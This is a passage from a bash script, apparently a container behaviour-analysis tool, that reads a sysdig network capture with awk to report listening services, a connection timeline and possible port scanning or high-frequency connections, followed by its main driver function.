            print "\n  Services Listening for Incoming Connections:"
            for (port in listening_services) {
                service_desc = ""
                if (port == "22") service_desc = " (SSH)"
                else if (port == "80") service_desc = " (HTTP Web)"
                else if (port == "443") service_desc = " (HTTPS Secure Web)"
                else if (port == "21") service_desc = " (FTP)"
                else service_desc = " (Unknown service)"

                printf "    - Port %s%s: %s process\n", port, service_desc, listening_services[port]
            }
        }
    }' "$temp_network_analysis/network_events.csv"

    # 2. CONNECTION TIMELINE ANALYSIS
    echo -e "\n${YELLOW}Connection Timeline Analysis:${NC}"
    awk -F',' 'BEGIN {
        print "  Network Event Timeline:"
        print "  Time      | Type     | Process      | Direction           | Details"
        print "  ----------|----------|--------------|---------------------|---------------------------"
    } {
        time = $1
        event_type = $2
        process = $3
        local_ip = $5
        local_port = $6
        remote_ip = $7
        remote_port = $8

        if (process == "<NA>") next

        if (start_time == "") start_time = time
        rel_time = time - start_time

        direction = ""
        details = ""

        if (event_type == "connect") {
            direction = "OUTBOUND"
            details = local_ip ":" local_port " -> " remote_ip ":" remote_port
        } else if (event_type == "bind") {
            direction = "LISTEN"
            details = "binding to " remote_ip ":" remote_port
        } else if (event_type == "accept") {
            direction = "INBOUND"
            details = local_ip ":" local_port " -> " remote_ip ":" remote_port
        } else if (event_type == "socket") {
            direction = "CREATE"
            details = "socket creation"
        }

        if (direction != "") {
            printf "  +%7.2fs | %-8s | %-12s | %-19s | %s\n", rel_time, event_type, process, direction, details
        }
    }' "$temp_network_analysis/network_events.csv" | head -20

    # 3. NETWORK BEHAVIOR PATTERN DETECTION
    echo -e "\n${YELLOW}Network Behavior Patterns:${NC}"

    # Port scanning detection
    echo -e "  Port Scanning Analysis:"
    awk -F',' '{
        if ($2 == "connect") {
            process = $3
            if (process == "<NA>") next
            target_ip = $7
            target_port = $8

            if (target_ip != "" && target_port != "") {
                scan_key = process ":" target_ip
                ports[scan_key] = ports[scan_key] target_port ","
                port_count[scan_key]++

                # Track timing for rapid scanning
                if (scan_times[scan_key] == "") scan_times[scan_key] = $1
                scan_end_time[scan_key] = $1
            }
        }
    } END {
        found_scans = 0
        for (scan_key in port_count) {
            if (port_count[scan_key] >= 5) {  # 5 or more ports = potential scan
                split(scan_key, parts, ":")
                process = parts[1]
                target = parts[2]

                time_span = scan_end_time[scan_key] - scan_times[scan_key]
                speed = (time_span > 0) ? port_count[scan_key] / time_span : 0

                printf "    %s scanned %d ports on %s", process, port_count[scan_key], target
                if (time_span > 0) {
                    printf " (%.1f ports/sec)\n", speed
                } else {
                    printf "\n"
                }

                found_scans++
            }
        }

        if (found_scans == 0) {
            print "    No port scanning detected"
        }
    }' "$temp_network_analysis/network_events.csv"

    # Connection frequency analysis
    echo -e "\n  Connection Frequency Analysis:"
    awk -F',' '{
        if ($2 == "connect") {
            if ($3 == "<NA>") next
            conn_key = $3 ":" $7  # process:target_ip
            freq_count[conn_key]++
        }
    } END {
        found_frequent = 0
        for (conn in freq_count) {
            if (freq_count[conn] >= 10) {  # 10+ connections to same target
                split(conn, parts, ":")
                printf "    High frequency: %s -> %s (%d connections)\n", parts[1], parts[2], freq_count[conn]
                found_frequent++
            }
        }

        if (found_frequent == 0) {
            print "    No high-frequency connection patterns detected"
        }
    }' "$temp_network_analysis/network_events.csv"

    # Unusual protocol combinations
    echo -e "\n  Protocol Combination Analysis:"
    awk -F',' '{
        if ($2 == "connect") {
            process = $3
            if (process == "<NA>") next
            port = $8

            if (port != "") {
                proc_ports[process] = proc_ports[process] port ","
                proc_port_count[process]++
            }
        }
    } END {
        found_unusual = 0
        for (process in proc_ports) {
            if (proc_port_count[process] >= 3) {
                # Count unique ports
                split(proc_ports[process], ports_array, ",")
                delete unique_ports
                unique_count = 0

                for (i in ports_array) {
                    if (ports_array[i] != "" && !(ports_array[i] in unique_ports)) {
                        unique_ports[ports_array[i]] = 1
                        unique_count++
                    }
                }

                if (unique_count >= 3) {
                    printf "    %s used %d different protocols", process, unique_count

                    # Show sample ports
                    sample_ports = ""
                    count = 0
                    for (port in unique_ports) {
                        if (count < 5) {
                            sample_ports = sample_ports port ","
                            count++
                        }
                    }
                    printf " (ports: %s)\n", substr(sample_ports, 1, length(sample_ports)-1)
                    found_unusual++
                }
            }
        }

        if (found_unusual == 0) {
            print "    No unusual protocol combinations detected"
        }
    }' "$temp_network_analysis/network_events.csv"

    # Cleanup
    rm -rf "$temp_network_analysis"

    echo -e "${BLUE}================================================================================${NC}"
}

ask_for_analysis() {
    # Skip analysis if requested
    if [[ "$SKIP_ANALYSIS" == true ]]; then
        echo -e "\n${YELLOW}Skipping analysis as requested${NC}"
        return
    fi

    # In automated modes, run analysis automatically
    if [[ "$COMMAND_MODE" == "single" || "$COMMAND_MODE" == "script" ]]; then
        echo -e "\n${GREEN}Analysis Results:${NC}"

        # FULL ANALYSIS - All available analysis modules (no duplicates)
        perform_file_analysis               # File system analysis (enhanced)
        analyze_process_behavior            # Process behavior analysis
        perform_enhanced_network_analysis   # Enhanced network analysis

        return
    fi
}

# Check required dependencies are installed
check_dependencies() {
    if [[ "$PLATFORM" == "kubernetes" ]] && ! command -v kubectl >/dev/null 2>&1; then
        echo -e "${RED}Error: kubectl is not installed or not in PATH${NC}"
        exit 1
    fi

    if [[ "$PLATFORM" == "docker" ]] && ! command -v docker >/dev/null 2>&1; then
        echo -e "${RED}Error: docker is not installed or not in PATH${NC}"
        exit 1
    fi

}

# Main function
main() {
    print_header

    parse_arguments "$@"

    check_dependencies

    ensure_scaps_directory

    if [[ "$COMMAND_MODE" != "single" && "$COMMAND_MODE" != "script" ]]; then
        echo -e "${RED}Error: Invalid command mode${NC}"
        show_usage
        exit 1
    fi

    wait_for_deployment
    wait_for_sysdig_ready

    get_package_requirements

    prepare_commands

    start_capture_background

    execute_commands_with_timing || true

    stop_capture
    verify_and_copy_capture
    show_results
    ask_for_analysis
}

main "$@"
